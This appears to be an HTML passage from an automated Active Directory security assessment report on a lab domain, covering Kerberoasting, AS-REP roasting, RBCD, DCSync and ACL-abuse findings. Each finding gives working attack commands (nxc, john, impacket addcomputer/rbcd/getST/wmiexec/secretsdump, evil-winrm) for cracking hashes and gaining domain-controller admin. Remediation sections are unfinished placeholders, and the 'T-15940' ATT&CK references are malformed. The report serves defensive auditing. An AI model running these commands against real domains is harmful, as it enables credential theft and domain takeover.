                                    <p>Kerberoasting is a vulnerability where an account has a Service Principal Name (SPN) set and a weak password within Active Directory. In Microsoft Windows, SPNs are simply unique identifiers of service accounts. By design, to access the service run by the account, domain users request tickets (TGS) for that service using Kerberos which are encrypted with the service account’s NTLM hash. This is possible by any domain user, regardless if they have permission to access the service or not. The TGS is encrypted with a hashed vesion of the account's password, which can be retrieved from the TGS.</p>
                                    <p>This means for 2 users with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://attack.mitre.org/techniques/T1558/003/>">Link 1</a></p>
                                    <p><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts with an SPN set.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request a TGS for the service and extract the password hash from the TGS for the service account.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --kerberoasting output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --format=krb5tgs --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the SPN / move to low privileged account / gMSA.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Low-privileged-ASREP-roastable-user-with-a-weak-password"><u>Low privileged ASREP-roastable user with a weak password</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a low privileged account can be obtained and cracked.</td>                                        <td>T-15940</td>
                                <td>+25</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>bob<br>LILLY_ABBOTT<br>MARIA_NOBLE<br>MABEL_KENNEDY<br>PAULA_SNOW<br>JUANA_HORNE<br>HILARY_KIRK<br>MEREDITH_NOEL</td></tr>                                        <tr><td class="grey">Enabled</td><td>True</td></tr>
                                <tr><td class="grey">DoNotRequireKerberosPreauthentication</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>ASREP-roasting is a vulnerability where a user has the "Do not requrire Kerberos preauthentication" flag set within Active Directory. This means that when requesting a TGT from the KDC, the entire validation process of needing to present a timestamp encrypted with the user’s hashed password to validate that user is authorized to request the TGT is skipped. Therefore without even knowing the users password, it is possible to retrieve an encrypted TGT for the user in an AS-REP message.</p>
                                    <p>This means for 8 users it is possible to retrieve the user's hashed password and attempt to crack it if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://trustmarque.com/resources/asreproasting/>">Link 1</a></p>
                                    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts that have the "Do not require Kerberos preauthentication" flag set within the directory.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request an encrypted TGT for the user not requirng kerberos preauthenticaiton and obtain the password hash for the user.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --asreproast output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the do not require pre auth flag for X,Y,Z users - there is no use case for this.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Disabled-ASREP-roastable-user"><u>Disabled ASREP-roastable user</u></td>
            <td class="finding-riskLOW">LOW</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a disabled account can be obtained and cracked.</td>                                        <td>T-15940</td>
                                <td>+9</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>test2<br>MILO_ADAMS</td></tr>                                        <tr><td class="grey">Enabled</td><td>False</td></tr>
                                <tr><td class="grey">DoNotRequireKerberosPreauthentication</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>ASREP-roasting is a vulnerability where a user has the "Do not requrire Kerberos preauthentication" flag set within Active Directory. This means that when requesting a TGT from the KDC, the entire validation process of needing to present a timestamp encrypted with the user’s hashed password to validate that user is authorized to request the TGT is skipped. Therefore without even knowing the users password, it is possible to retrieve an encrypted TGT for the user in an AS-REP message.</p>
                                    <p>This means for 2 users it is possible to retrieve the user's hashed password and attempt to crack it if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://trustmarque.com/resources/asreproasting/>">Link 1</a></p>
                                    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts that have the "Do not require Kerberos preauthentication" flag set within the directory.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request an encrypted TGT for the user not requirng kerberos preauthenticaiton and obtain the password hash for the user.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --asreproast output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the do not require pre auth flag for X,Y,Z users - there is no use case for this.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Disabled-Kerberoastable-account"><u>Disabled Kerberoastable account</u></td>
            <td class="finding-riskLOW">LOW</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>                                        <td>T1558.003</td>
                                <td>+9</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>kerberoast-disabled<br>HELENE_PARSONS</td></tr>
                                    <tr><td class="grey">SPN</td><td>a/HOST<br>CIFS/test</td></tr>                                        <tr><td class="grey">Enabled</td><td>False</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Kerberoasting is a vulnerability where an account has a Service Principal Name (SPN) set and a weak password within Active Directory. In Microsoft Windows, SPNs are simply unique identifiers of service accounts. By design, to access the service run by the account, domain users request tickets (TGS) for that service using Kerberos which are encrypted with the service account’s NTLM hash. This is possible by any domain user, regardless if they have permission to access the service or not. The TGS is encrypted with a hashed vesion of the account's password, which can be retrieved from the TGS.</p>
                                    <p>This means for 2 users with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://attack.mitre.org/techniques/T1558/003/>">Link 1</a></p>
                                    <p><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts with an SPN set.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request a TGS for the service and extract the password hash from the TGS for the service account.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --kerberoasting output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --format=krb5tgs --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the SPN / move to low privileged account / gMSA.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr></tbody></table></div>

        <div class="finding-header">ACLs</div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Issue</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>                <tr>
                    <td class="toggle" id="Low-privileged-principal-has-dangerous-RBCD-rights"><u>Low privileged principal has dangerous RBCD rights</u></td>
                    <td class="finding-riskCRITICAL">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user can take full control of a server.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>CN=DC,OU=Domain Controllers,DC=test,DC=local</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>TEST\rbcduser</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>Allow</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>GenericAll</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an server. With full control over a server, it is possible to exploit resource-based constrained delegation (RBCD) as the principal has permission to set the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property on the target server.</p>
                                            <p>TEST\rbcduser has dangerous RBCD privileges (GenericAll) over CN=DC,OU=Domain Controllers,DC=test,DC=local. This gives TEST\rbcduser the ability to take full control over the target server via RBCD.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/rbcd-resource-based-constrained-delegation-abuse/">Link 1</a></p>
                                            <p><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs over target servers for rights such as GenericWrite / GenericAll using bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/RBCD-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. To exploit resource-based constrained delegation an attacker must have control of an account with an SPN set in order to simulate the front-end service, for which the easiest way is to add a computer account if the machineaccountquota is not 0, as computer accounts have SPNs by default.</p>
                                                    <p class="code">impacket-addcomputer -computer-name 'attackerPC$' -computer-pass 'h4x' test.local/test:'Password123!'</p>
                                                    <p>Then using the rights over the target server an adversary can update the msDS-AllowedToActOnBehalfOfOtherIdentity property on the target server (backend service) to configure resource-based constrained delegation from the attacker machine (frontend).</p>
                                                    <p class="code">impacket-rbcd -delegate-from 'attackerPC$' -delegate-to 'DC$' -dc-ip 192.168.10.141 -action 'write' 'test.local'/'rbcduser':'Password123!'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/RBCD-2.png"
                                                        alt="Setting RBCD">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. With control of the frontend service (the added attacker computer), an adversary can request a ticket for any service on the backend they have full control over (DC$).</p>
                                                    <p class="code">impacket-getST -spn 'cifs/dc.test.local' -impersonate 'administrator' 'test.local/attackerPC$':'h4x' </p>
                                                    <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service.</p>
                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                                    <p class="code">impacket-wmiexec -k -no-pass administrator@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/RBCD-3.png"
                                                        alt="Exploiting RBCD">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Low-privileged-principal-has-DCSync-rights"><u>Low privileged principal has DCSync rights</u></td>
                    <td class="finding-riskCRITICAL">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user has indirect control of the entire domain.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>DC=test,DC=local</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>TEST\dcsyncer</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>Allow</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>ExtendedRight</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an object. Assigning specific ACE permissions to a user over the domain itself is particularly dangerous as without being a member of an auditable and controlled group such as domain admins, a principal may have equivalent rights yet be unknown to the management team.</p>
                                            <p>TEST\dcsyncer has DCSync (ExtendedRight) rights over DC=test,DC=local. This gives TEST\dcsyncer ability to the behavior of a domain controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/abusing-acl-misconfigurations/">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/securing-active-directory-via-acls/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs over the domain object for rights such as AllExtendedRights (permission to DCSync) using bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/dcsync-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With the low-privileged user granted the rogue DCSync permsissions, the user has ability to the behavior of a domain controller and obtain all the user password hashes within the domain via a DCSync, then use any prvivileged credential as they desire.</p>
                                                    <p class="code">impacket-secretsdump dcsyncer:'Password123!'@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/dcsync-2.png"
                                                        alt="Exploiting rogue ACLs">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Low-privileged-principal-has-dangerous-rights-over-the-entire-domain"><u>Low privileged principal has dangerous rights over the entire domain</u></td>
                    <td class="finding-riskCRITICAL">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user has indirect control of the entire domain.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>DC=test,DC=local</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>TEST\test</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>Allow</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>GenericAll</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an object. Assigning specific ACE permissions to a user over the domain itself is particularly dangerous as without being a member of an auditable and controlled group such as domain admins, a principal may have equivalent rights yet be unknown to the management team.</p>
                                            <p>TEST\test has dangerous rights (GenericAll) over DC=test,DC=local. This gives TEST\test full control of the domain.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/abusing-acl-misconfigurations/">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/securing-active-directory-via-acls/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs over the domain object for rights such as GenericAll, GenericWrite, WriteDacl or AllExtendedRights using bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/entiredomain-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With the low-privileged user granted the rogue permsissions, the user has effective domain admin privileges. Therefore, it is as simple as performing a DCSync to extract all user password hashes within the domain.</p>
                                                    <p class="code">impacket-secretsdump test:'Password123!'@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/entiredomain-2.png"
                                                        alt="Exploiting rogue ACLs">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Low-privileged-principal-has-dangerous-rights"><u>Low privileged principal has dangerous rights</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user can take control of another principal and inherit their rights.</td>
                                        <td>T-15940</td>
                                        <td>+35</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>CN=Remote Management Users,CN=Builtin,DC=test,DC=local</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>TEST\test</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>Allow</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>GenericAll</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an object. With full privilege over an object, a user can take control of it by resetting the object's password, adding shadow credentials or through a targeted kerberoast attack.</p>
                                            <p>TEST\test has dangerous rights (GenericAll) over CN=Remote Management Users,CN=Builtin,DC=test,DC=local. This gives the principal full control over the target object.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/abusing-acl-misconfigurations/">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/securing-active-directory-via-acls/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs using bloodhound. In this example account operators has full control over the "remotemanagement" user who has permission to connect to the domaincontroller via WinRM.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/dangerousright-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With full control of the remotemanagement account, the low-privileged user can simply reset the target account's password and impersonate the user and their privielges to remotely connect to the DC.</p>
                                                    <p class="code">net rpc password remotemanagement -U 'test.local/accountopertor%Password123!' -S test.local</p>
                                                    <p class="code">evil-winrm -i dc.test.local -u remotemanagement -p newpassword</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/dangerousright-2.png"
                                                        alt="Exploiting rogue ACLs">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Modifiable-logon-script"><u>Modifiable logon script</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user can edit / replace a NETLOGON script with malicious code.</td>
                                        <td>T-15940</td>
                                        <td>+30</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">File</td><td>\\test.local\sysvol\test.local\scripts\ADcreate.vbs</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>NT AUTHORITY\Authenticated Users</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>FullControl</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>A logon script is a script that is executed under the context of a given user when that user logs into a computer in an Active Directory environment. These are stored in \\<domain>\NETLOGON folder on domain controllers and are typically used for things such as map file shares, add printers, update software or set background wallpapers with files from a central repository.</p>
                                            <p>Risks occur when these files have weak ACLs assigned, allowing modification from an unauthorised user. An adversary may replace the file with a malicious file and this will be executed by users unknowingly from the central location.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any low-privileged user can browse through NETLOGON scripts and find those which have insecure permissions assigned allowing modification.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/modifiablelogonscript-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
